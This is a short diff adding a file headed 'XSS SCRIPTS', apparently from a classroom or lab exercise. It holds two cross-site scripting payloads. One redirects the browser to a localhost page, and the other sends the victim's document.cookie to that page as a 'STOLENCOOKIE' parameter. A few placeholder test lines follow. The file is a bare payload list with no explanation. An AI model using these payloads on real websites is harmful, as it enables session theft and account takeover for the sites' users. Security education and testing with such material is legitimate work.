@@ -1,0 +1,12 @@
+XSS SCRIPTS:
+
+REDIRECTION <script> window.location='http://localhost:1440/Team2014.aspx' </script>
+
+REDIRECTION + COOKIE <script> window.location='http://localhost:1440/Team2014.aspx?STOLENCOOKIE=' +document.cookie </script>
+
+
+
+
+: cookie=poop&documenturl=facebook
+: cookie=poop&documenturl=facebook
+: cookie=poop&&documenturl=facebook
